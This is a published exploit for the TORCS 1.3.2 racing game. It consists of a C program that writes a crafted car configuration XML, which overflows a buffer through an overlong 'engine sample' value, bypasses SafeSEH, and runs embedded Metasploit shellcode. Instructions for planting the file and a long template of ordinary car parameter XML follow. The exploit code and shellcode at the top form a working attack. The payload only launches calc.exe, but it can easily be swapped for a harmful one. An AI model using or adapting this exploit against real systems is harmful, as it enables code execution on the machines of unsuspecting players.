/* Exploit Title: TORCS <= 1.3.2 buffer overflow /SAFESEH evasion
# Date: 07/02/2012
# Discovered and exploited by: Fluidsignal Group -> Research Team Division
# Author:   Andres Gomez and David Mora (a.k.a Mighty-D) ... Pwn and beans!
# Software Link: http://torcs.sourceforge.net/
# Version: torcs 1.3.2
# Vendor notified: 03/02/2012
# Tested on: Windows XP Service Pack 3 Spanish
# CVE : */

/* 
Create template.xml file (see and the end of submission). Place both .c and template.xml files
in the same folder. Run the exploit, this will append a 'sound' section in the template file.
Move the xml file into torcs/cars/sc-f1/ and replace sc-f1.xml (F1 car Config.) for example.
Choose car and run a race. Torcs will then crash.
*/


#include <stdio.h>
#include <stdlib.h>

/*
   Shellcode: msfpayload windows/exec CMD=calc.exe R | msfencode register=ebp -e x86/alpha_mixed -t c
*/

unsigned char shellcode[] = 
"\x55\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x5a\x48\x4f\x79\x43\x30"
"\x45\x50\x45\x50\x51\x70\x4b\x39\x4d\x35\x50\x31\x4b\x62\x51"
"\x74\x4c\x4b\x50\x52\x50\x30\x4c\x4b\x50\x52\x54\x4c\x4c\x4b"
"\x50\x52\x47\x64\x4e\x6b\x51\x62\x51\x38\x56\x6f\x4d\x67\x51"
"\x5a\x54\x66\x54\x71\x49\x6f\x56\x51\x4f\x30\x4e\x4c\x47\x4c"
"\x50\x61\x51\x6c\x54\x42\x56\x4c\x51\x30\x4f\x31\x58\x4f\x56"
"\x6d\x56\x61\x4b\x77\x49\x72\x5a\x50\x52\x72\x43\x67\x4e\x6b"
"\x51\x42\x54\x50\x4e\x6b\x43\x72\x45\x6c\x45\x51\x58\x50\x4c"
"\x4b\x51\x50\x52\x58\x4e\x65\x4f\x30\x43\x44\x43\x7a\x47\x71"
"\x58\x50\x56\x30\x4c\x4b\x43\x78\x54\x58\x4e\x6b\x43\x68\x47"
"\x50\x43\x31\x4e\x33\x4b\x53\x45\x6c\x52\x69\x4c\x4b\x45\x64"
"\x4c\x4b\x56\x61\x58\x56\x56\x51\x49\x6f\x54\x71\x4f\x30\x4e"
"\x4c\x5a\x61\x58\x4f\x56\x6d\x45\x51\x58\x47\x56\x58\x49\x70"
"\x51\x65\x5a\x54\x56\x63\x43\x4d\x49\x68\x47\x4b\x43\x4d\x47"
"\x54\x52\x55\x4d\x32\x51\x48\x4c\x4b\x43\x68\x51\x34\x47\x71"
"\x4b\x63\x50\x66\x4c\x4b\x54\x4c\x52\x6b\x4e\x6b\x43\x68\x47"
"\x6c\x45\x51\x5a\x73\x4c\x4b\x47\x74\x4c\x4b\x43\x31\x5a\x70"
"\x4c\x49\x52\x64\x56\x44\x51\x34\x51\x4b\x51\x4b\x43\x51\x52"
"\x79\x52\x7a\x56\x31\x49\x6f\x49\x70\x43\x68\x51\x4f\x50\x5a"
"\x4c\x4b\x54\x52\x5a\x4b\x4f\x76\x51\x4d\x52\x4a\x43\x31\x4c"
"\x4d\x4e\x65\x4d\x69\x47\x70\x45\x50\x47\x70\x56\x30\x51\x78"
"\x45\x61\x4e\x6b\x50\x6f\x4f\x77\x4b\x4f\x58\x55\x4d\x6b\x5a"
"\x50\x58\x35\x4f\x52\x43\x66\x43\x58\x4d\x76\x5a\x35\x4f\x4d"
"\x4d\x4d\x4b\x4f\x4b\x65\x45\x6c\x54\x46\x51\x6c\x45\x5a\x4f"
"\x70\x49\x6b\x49\x70\x51\x65\x43\x35\x4f\x4b\x52\x67\x52\x33"
"\x43\x42\x50\x6f\x50\x6a\x47\x70\x56\x33\x49\x6f\x49\x45\x50"
"\x63\x45\x31\x50\x6c\x50\x63\x54\x6e\x51\x75\x54\x38\x50\x65"
"\x45\x50\x41\x41";

unsigned char stage[] = "\x55\x58\x35\x41\x41\x41\x75\x35\x69\x4A\x41\x75\x50\x5D";// ebp = &shellcode
unsigned char seh_pointer [] = "\x4E\x20\xC9\x72"; // seh pointer pop pop ret; no safeseh on msacm32.drv 
unsigned char short_jump [] = "\xEB\x20\x41\x41"; // short jump;

int main(int argc, char **argv) {

    FILE *save_fd;
    int i=0;

    save_fd = fopen("template.xml", "a+");

    if (save_fd == NULL) {
	    printf("Failed to open '%s' for writing", "template.xml");
	    return -1;
    }

    fprintf(save_fd, "<section name=\"Sound\">\n"
		     "<attstr name=\"engine sample\" val=\"");
    for(i=0; i < 1529; i++) {
    	putc('\x41', save_fd);
    }
    fprintf(save_fd, "%s", short_jump);
    fprintf(save_fd, "%s", seh_pointer);
    for(i=0; i < 0x22; i++) {
    	putc('\x41', save_fd);
    }
    fprintf(save_fd, "%s", stage);
    for(i=0; i < 8; i++) {
    	putc('\x41', save_fd);
    }
    fprintf(save_fd, "%s", shellcode);
    fprintf(save_fd, "\"/>\n");
    fprintf(save_fd, "<attnum name=\"rpm scale\" val=\"0.35\"/>\n");
    fprintf(save_fd, "</section>\n");
    fprintf(save_fd, "</params>\n");

    close(save_fd);

    return 0;
}

=====================
TEMPLATE.XML
<?xml version="1.0" encoding="UTF-8"?>

<!-- 
	 file                 : sc-f1.xml
	 created              : Tue Nov 02 23:03:59 CET 2000
	 copyright            : (C) 2004 by SpeedyChonChon
	 email                : speedy.chonchon@free.fr
	 version              : $Id: sc-f1.xml,v 1.5.2.1 2008/06/01 09:56:42 berniw Exp $
	 -->

<!--    This program is free software; you can redistribute it and/or modify  -->
<!--    it under the terms of the GNU General Public License as published by  -->
<!--    the Free Software Foundation; either version 2 of the License, or     -->
<!--    (at your option) any later version.                                   -->

<!DOCTYPE params SYSTEM "../../../../src/libs/tgf/params.dtd">

<params name="Formula One" type="template">
	<section name="Driver">
		
		<!-- Position of the driver -->
		<attnum name="xpos" val="0.1" unit="m"/>
		<attnum name="ypos" val="0.0" unit="m"/>
		<attnum name="zpos" val="0.73" unit="m"/>
	</section>
	
	<section name="Graphic Objects">
		<attstr name="env" val="sc-f1.acc"/>
		<attstr name="wheel texture" val="tex-wheel.rgb"/>
		<attstr name="shadow texture" val="shadow.rgb"/>
		<attstr name="tachometer texture" val="rpm20000.rgb"/>
		<attnum name="tachometer min value" val="0" unit="rpm"/>
		<attnum name="tachometer max value" val="20000" unit="rpm"/>
		<attstr name="speedometer texture" val="speed360.rgb"/>
		<attnum name="speedometer min value" val="0" unit="km/h"/>
		<attnum name="speedometer max value" val="360" unit="km/h"/>
		
		<section name="Ranges">
			<section name="1">
				<attnum name="threshold" val="0"/>
				<attstr name="car" val="sc-f1.acc"/>
				<attstr name="wheels" val="yes"/>
			</section>
		</section>
		
		<!--    <section name="Light">
			<section name="1">
				<attstr name="type" val="brake2"/>
				<attnum name="xpos" val="-2.36"/>
				<attnum name="ypos" val="0.52"/>
				<attnum name="zpos" val="0.67"/>
				<attnum name="size" val="0.3"/>
			</section>
			<section name="2">
				<attstr name="type" val="brake2"/>
				<attnum name="xpos" val="-2.36"/>
				<attnum name="ypos" val="-0.52"/>
				<attnum name="zpos" val="0.67"/>
				<attnum name="size" val="0.3"/>
			</section>
		</section>-->
		
	</section>
	
	<section name="Car">
		<attstr name="category" val="F1"/>
		<attnum name="body length" unit="m" val="4.8"/>
		<attnum name="body width" unit="m" val="1.8"/>
		<attnum name="body height" unit="m" val="1.08"/>
		
		<!-- collision bounding box -->
		<attnum name="overall length" unit="m" val="4.8"/>
		<attnum name="overall width" unit="m" val="2.4"/>
		<attnum name="mass" unit="kg" val="600.0"/>
		<attnum name="GC height" unit="m" val="0.20"/>
		
		<!-- weight bias -->
		<attnum name="front-rear weight repartition" min="0.3" max="0.7" val="0.4"/>
		<attnum name="front right-left weight repartition" min="0.4" max="0.6" val="0.5"/>
		<attnum name="rear right-left weight repartition" min="0.4" max="0.6" val="0.5"/>
		
		<!-- used for inertia, smaller values indicate better mass centering -->
		<attnum name="mass repartition coefficient" val="0.6" min="0.4" max="1.0"/>
		<attnum name="fuel tank" unit="l" val="100.0"/>
		<attnum name="initial fuel" unit="l" min="1.0" max="100.0" val="100.0"/>
	</section>
	
	<section name="Exhaust">
		
		<!-- for flames -->
		<attnum name="power" val="1.5"/>
		<section name="1">
			<attnum name="xpos" val="-2.15"/>
			<attnum name="ypos" val="-0.48"/>
			<attnum name="zpos" val="0.23"/>
		</section>
		
		<section name="2">
			<attnum name="xpos" val="-2.15"/>
			<attnum name="ypos" val="0.48"/>
			<attnum name="zpos" val="0.23"/>
		</section>
	</section>
	
	
	<section name="Aerodynamics">
		<attnum name="Cx" val="0.32"/>
		<attnum name="front area" unit="m2" val="2.0"/>
		<attnum name="front Clift" val="0.2"/>
		<attnum name="rear Clift" val="0.7"/>
	</section>
	
	<section name="Front Wing">
		<attnum name="area" unit="m2" val="0.8"/>
		<attnum name="angle" unit="deg" val="13"/>
		<attnum name="xpos" unit="m" val="2.0"/>
		<attnum name="zpos" unit="m" val=".1"/>
	</section>
	
	<section name="Rear Wing">
		<attnum name="area" unit="m2" val="1.1"/>
		<attnum name="angle" unit="deg" val="7"/>
		<attnum name="xpos" unit="m" val="-2.0"/>
		<attnum name="zpos" unit="m" val=".5"/>
	</section>
	
	
	<!-- Same engine for every one -->
	<section name="Engine">
		<attnum name="revs maxi" unit="rpm" min="5000" max="20000" val="20000"/>
		<attnum name="revs limiter" unit="rpm" min="3000" max="20000" val="18700"/>
		<attnum name="tickover" unit="rpm" val="5000"/>
		<attnum name="fuel cons factor" min="1.1" max="1.3" val="1.3"/>
		<section name="data points">
			<section name="1">
				<attnum name="rpm" unit="rpm" val="0"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="2000.0" val="100"/>
			</section>
			
			<section name="2">
				<attnum name="rpm" unit="rpm" val="1000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="1473.0" val="100"/>
			</section>
			
			<section name="3">
				<attnum name="rpm" unit="rpm" val="2000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="1355.0" val="120"/>
			</section>
			
			<section name="4">
				<attnum name="rpm" unit="rpm" val="3000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="1275.0" val="140"/>
			</section>
			
			<section name="5">
				<attnum name="rpm" unit="rpm" val="4000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="1145.0" val="160"/>
			</section>
			
			<section name="6">
				<attnum name="rpm" unit="rpm" val="5000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="1000.0" val="180"/>
			</section>
			
			<section name="7">
				<attnum name="rpm" unit="rpm" val="6000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="884.0" val="220"/>
			</section>
			
			<section name="8">
				<attnum name="rpm" unit="rpm" val="7000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="799.0" val="260"/>
			</section>
			
			<section name="9">
				<attnum name="rpm" unit="rpm" val="8000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="735.0" val="300"/>
			</section>
			
			<section name="10">
				<attnum name="rpm" unit="rpm" val="9000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="686.0" val="340"/>
			</section>
			
			<section name="11">
				<attnum name="rpm" unit="rpm" val="10000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="647.0" val="340"/>
			</section>
			
			<section name="12">
				<attnum name="rpm" unit="rpm" val="11000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="971.0" val="340.0"/>
			</section>
			
			<section name="13">
				<attnum name="rpm" unit="rpm" val="12000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="890.0" val="340.0"/>
			</section>
			
			<section name="14">
				<attnum name="rpm" unit="rpm" val="13000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="821.0" val="345.0"/>
			</section>
			
			<section name="15">
				<attnum name="rpm" unit="rpm" val="14000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="762.0" val="350.0"/>
			</section>
			
			<section name="16">
				<attnum name="rpm" unit="rpm" val="15000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="712.0" val="355.0"/>
			</section>
			
			<section name="17">
				<attnum name="rpm" unit="rpm" val="16000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="667.0" val="360.0"/>
			</section>
			
			<section name="18">
				<attnum name="rpm" unit="rpm" val="17000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="628.0" val="360.0"/>
			</section>
			
			<section name="19">
				<attnum name="rpm" unit="rpm" val="18000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="593.0" val="360.0"/>
			</section>
			
			<section name="20">
				<attnum name="rpm" unit="rpm" val="19000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="562.0" val="330.0"/>
			</section>
			
			<section name="21">
				<attnum name="rpm" unit="rpm" val="20000"/>
				<attnum name="Tq" unit="N.m" min="0.0" max="534.0" val="300.0"/>
			</section>
		</section>
	</section>
	
	<section name="Clutch">
		
		<!-- pressure plate -->
		<attnum name="inertia" unit="kg.m2" val="0.1150"/>
	</section>
	
	
	<section name="Gearbox">
		<attnum name="shift time" val="0.05" unit="s"/>
		<section name="gears">
			<section name="r">
				<attnum name="ratio" min="-3" max="0" val="-2.0"/>
				<attnum name="inertia" val="0.0037"/>
				<attnum name="efficiency" val="0.957"/>
			</section>
			
			<section name="1">
				<attnum name="ratio" min="0" max="5" val="3.9"/>
				<attnum name="inertia" val="0.003"/>
				<attnum name="efficiency" val="0.955"/>
			</section>
			
			<section name="2">
				<attnum name="ratio" min="0" max="5" val="2.9"/>
				<attnum name="inertia" val="0.0037"/>
				<attnum name="efficiency" val="0.957"/>
			</section>
			
			<section name="3">
				<attnum name="ratio" min="0" max="5" val="2.3"/>
				<attnum name="inertia" val="0.0048"/>
				<attnum name="efficiency" val="0.950"/>
			</section>
			
			<section name="4">
				<attnum name="ratio" min="0" max="5" val="1.87"/>
				<attnum name="inertia" val="0.0064"/>
				<attnum name="efficiency" val="0.983"/>
			</section>
			
			<section name="5">
				<attnum name="ratio" min="0" max="5" val="1.68"/>
				<attnum name="inertia" val="0.0107"/>
				<attnum name="efficiency" val="0.948"/>
			</section>
			
			<section name="6">
				<attnum name="ratio" min="0" max="5" val="1.54"/>
				<attnum name="inertia" val="0.0150"/>
				<attnum name="efficiency" val="0.940"/>
			</section>
			
			<section name="7">
				<attnum name="ratio" min="0" max="5" val="1.46"/>
				<attnum name="inertia" val="0.0150"/>
				<attnum name="efficiency" val="0.940"/>
			</section>
			
			
		</section>
	</section>
	
	<section name="Steer">
		<attnum name="steer lock" unit="deg" min="1" max="21" val="21"/>
		<attnum name="max steer speed" unit="deg/s" min="1" max="360" val="360"/>
	</section>
	
	<section name="Drivetrain">
		<attstr name="type" val="RWD"/>
		<attnum name="inertia" unit="kg.m2" val="0.0091"/>
	</section>
	
	<section name="Rear Differential">
		
		<!-- type of differential : SPOOL (locked), FREE, LIMITED SLIP -->
		<attstr name="type" in="SPOOL,FREE,LIMITED SLIP" val="LIMITED SLIP"/>
		<attnum name="inertia" unit="kg.m2" val="0.0488"/>
		<attnum name="ratio" min="0" max="10" val="4.5"/>
		<attnum name="efficiency" val="0.9625"/>
	</section>
	
	<section name="Brake System">
		<attnum name="front-rear brake repartition" min="0.3" max="0.7" val="0.45"/>
		<attnum name="max pressure" unit="kPa" min="100" max="150000" val="24000"/>
	</section>
	
	<section name="Front Axle">
		<attnum name="xpos" unit="m" val="1.6"/>
		<attnum name="inertia" unit="kg.m2" val="0.0056"/>
		<attnum name="roll center height" unit="m" val="0.012"/>
	</section>
	
	<section name="Rear Axle">
		<attnum name="xpos" unit="m" val="-1.35"/>
		<attnum name="inertia" unit="kg.m2" val="0.0080"/>
		<attnum name="roll center height" unit="m" val="0.04"/>
	</section>
	
	<section name="Front Right Wheel">
		<attnum name="ypos" unit="m" val="-0.70"/>
		<attnum name="rim diameter" unit="in" val="12"/>
		<attnum name="tire width" unit="mm" val="300"/>
		<attnum name="tire height-width ratio" val="0.5"/>
		<attnum name="inertia" unit="kg.m2" val="1.2200"/>
		
		<!-- initial ride height -->
		<attnum name="ride height" unit="mm" min="50" max="300" val="70"/>
		<attnum name="toe" unit="deg" min="-5" max="5" val="0"/>
		<attnum name="camber" min="-5" max="0" unit="deg" val="-4"/>
		
		<!-- Adherence -->
		<attnum name="stiffness" min="20.0" max="50.0" val="20.0"/>
		<attnum name="dynamic friction" unit="%" min="70" max="80" val="70"/>
		<attnum name="rolling resistance" val="0.03"/>
		<attnum name="mu" min="0.05" max="1.8" val="1.6"/>
	</section>
	
	<section name="Front Left Wheel">
		<attnum name="ypos" unit="m" val="0.70"/>
		<attnum name="rim diameter" unit="in" val="12"/>
		<attnum name="tire width" unit="mm" val="300"/>
		<attnum name="tire height-width ratio" val="0.5"/>
		
		<!-- initial ride height -->
		<attnum name="ride height" unit="mm" min="50" max="300" val="70"/>
		<attnum name="toe" unit="deg" min="-5" max="5" val="0"/>
		<attnum name="camber" min="-5" max="0" unit="deg" val="-4"/>
		
		<!-- Adherence -->
		<attnum name="stiffness" min="20.0" max="50.0" val="20.0"/>
		<attnum name="dynamic friction" unit="%" min="70" max="80" val="70"/>
		<attnum name="rolling resistance" val="0.03"/>
		<attnum name="mu" min="0.05" max="1.8" val="1.6"/>
	</section>
	
	<section name="Rear Right Wheel">
		<attnum name="ypos" unit="m" val="-0.75"/>
		<attnum name="rim diameter" unit="in" val="13"/>
		<attnum name="tire width" unit="mm" val="300"/>
		<attnum name="tire height-width ratio" val=".5"/>
		
		<!-- initial ride height -->
		<attnum name="ride height" unit="mm" min="50" max="300" val="100"/>
		<attnum name="toe" unit="deg" min="-5" max="5" val="0.15"/>
		<attnum name="camber" min="-5" max="0" unit="deg" val="-1.5"/>
		
		<!-- Adherence -->
		<attnum name="stiffness" min="20.0" max="50.0" val="20.0"/>
		<attnum name="dynamic friction" unit="%" min="70" max="80" val="70"/>
		<attnum name="rolling resistance" val="0.03"/>
		<attnum name="mu" min="0.05" max="1.8" val="1.6"/>
	</section>
	
	<section name="Rear Left Wheel">
		<attnum name="ypos" unit="m" val="0.75"/>
		<attnum name="rim diameter" unit="in" val="13"/>
		<attnum name="tire width" unit="mm" val="300"/>
		<attnum name="tire height-width ratio" val=".5"/>
		
		<!-- initial ride height -->
		<attnum name="ride height" unit="mm" min="50" max="300" val="100"/>
		<attnum name="toe" unit="deg" min="-5" max="5" val="-0.15"/>
		<attnum name="camber" min="-5" max="0" unit="deg" val="-1.5"/>
		
		<!-- Adherence -->
		<attnum name="stiffness" min="20.0" max="50.0" val="20.0"/>
		<attnum name="dynamic friction" unit="%" min="70" max="80" val="70"/>
		<attnum name="rolling resistance" val="0.03"/>
		<attnum name="mu" min="0.05" max="1.8" val="1.6"/>
	</section>
	
	<section name="Front Anti-Roll Bar">
		<attnum name="spring" unit="lbs/in" min="0" max="5000" val="0"/>
		<attnum name="suspension course" unit="m" min="0" max="0.2" val="0.2"/>
		<attnum name="bellcrank" min="1" max="5" val="2.5"/>
	</section>
	
	<section name="Rear Anti-Roll Bar">
		<attnum name="spring" unit="lbs/in" min="0" max="5000" val="0"/>
		<attnum name="suspension course" unit="m" min="0" max="0.2" val="0.2"/>
		<attnum name="bellcrank" min="1" max="5" val="2.5"/>
	</section>
	
	<section name="Front Right Suspension">
		<attnum name="spring" unit="lbs/in" min="0" max="10000" val="2000"/>
		<attnum name="suspension course" unit="m" min="0" max="0.2" val="0.2"/>
		<attnum name="bellcrank" min="0.1" max="5" val="1.5"/>
		<attnum name="packers" unit="mm" min="0" max="10" val="0"/>
		<attnum name="slow bump" unit="lbs/in/s" min="0" max="1000" val="80"/>
		<attnum name="slow rebound" unit="lbs/in/s" min="0" max="1000" val="80"/>
		<attnum name="fast bump" unit="lbs/in/s" min="0" max="1000" val="30"/>
		<attnum name="fast rebound" unit="lbs/in/s" min="0" max="1000" val="30"/>
	</section>
	
	<section name="Front Left Suspension">
		<attnum name="spring" unit="lbs/in" min="0" max="10000" val="2000"/>
		<attnum name="suspension course" unit="m" min="0" max="0.2" val="0.2"/>
		<attnum name="bellcrank" min="0.1" max="5" val="1.5"/>
		<attnum name="packers" unit="mm" min="0" max="10" val="0"/>
		<attnum name="slow bump" unit="lbs/in/s" min="0" max="1000" val="80"/>
		<attnum name="slow rebound" unit="lbs/in/s" min="0" max="1000" val="80"/>
		<attnum name="fast bump" unit="lbs/in/s" min="0" max="1000" val="30"/>
		<attnum name="fast rebound" unit="lbs/in/s" min="0" max="1000" val="30"/>
	</section>
	
	<section name="Rear Right Suspension">
		<attnum name="spring" unit="lbs/in" min="0" max="10000" val="4000"/>
		<attnum name="suspension course" unit="m" min="0" max="0.2" val="0.2"/>
		<attnum name="bellcrank" min="0.1" max="5" val="1.5"/>
		<attnum name="packers" unit="mm" min="0" max="10" val="0"/>
		<attnum name="slow bump" unit="lbs/in/s" min="0" max="1000" val="80"/>
		<attnum name="slow rebound" unit="lbs/in/s" min="0" max="1000" val="80"/>
		<attnum name="fast bump" unit="lbs/in/s" min="0" max="1000" val="30"/>
		<attnum name="fast rebound" unit="lbs/in/s" min="0" max="1000" val="30"/>
	</section>
	
	<section name="Rear Left Suspension">
		<attnum name="spring" unit="lbs/in" min="0" max="10000" val="4000"/>
		<attnum name="suspension course" unit="m" min="0" max="0.2" val="0.2"/>
		<attnum name="bellcrank" min="0.1" max="5" val="1.5"/>
		<attnum name="packers" unit="mm" min="0" max="10" val="0"/>
		<attnum name="slow bump" unit="lbs/in/s" min="0" max="1000" val="80"/>
		<attnum name="slow rebound" unit="lbs/in/s" min="0" max="1000" val="80"/>
		<attnum name="fast bump" unit="lbs/in/s" min="0" max="1000" val="30"/>
		<attnum name="fast rebound" unit="lbs/in/s" min="0" max="1000" val="30"/>
	</section>
	
	<section name="Front Right Brake">
		<attnum name="disk diameter" unit="mm" min="100" max="380" val="380"/>
		<attnum name="piston area" unit="cm2" val="50"/>
		<attnum name="mu" val="0.3"/>
		<attnum name="inertia" unit="kg.m2" val="0.1241"/>
	</section>
	
	<section name="Front Left Brake">
		<attnum name="disk diameter" unit="mm" min="100" max="380" val="380"/>
		<attnum name="piston area" unit="cm2" val="50"/>
		<attnum name="mu" val="0.3"/>
		<attnum name="inertia" unit="kg.m2" val="0.1241"/>
	</section>
	
	<section name="Rear Right Brake">
		<attnum name="disk diameter" unit="mm" min="100" max="380" val="350"/>
		<attnum name="piston area" unit="cm2" val="25"/>
		<attnum name="mu" val="0.3"/>
		<attnum name="inertia" unit="kg.m2" val="0.0714"/>
	</section>
	
	<section name="Rear Left Brake">
		<attnum name="disk diameter" unit="mm" min="100" max="380" val="350"/>
		<attnum name="piston area" unit="cm2" val="25"/>
		<attnum name="mu" val="0.3"/>
		<attnum name="inertia" unit="kg.m2" val="0.0714"/>
	</section>

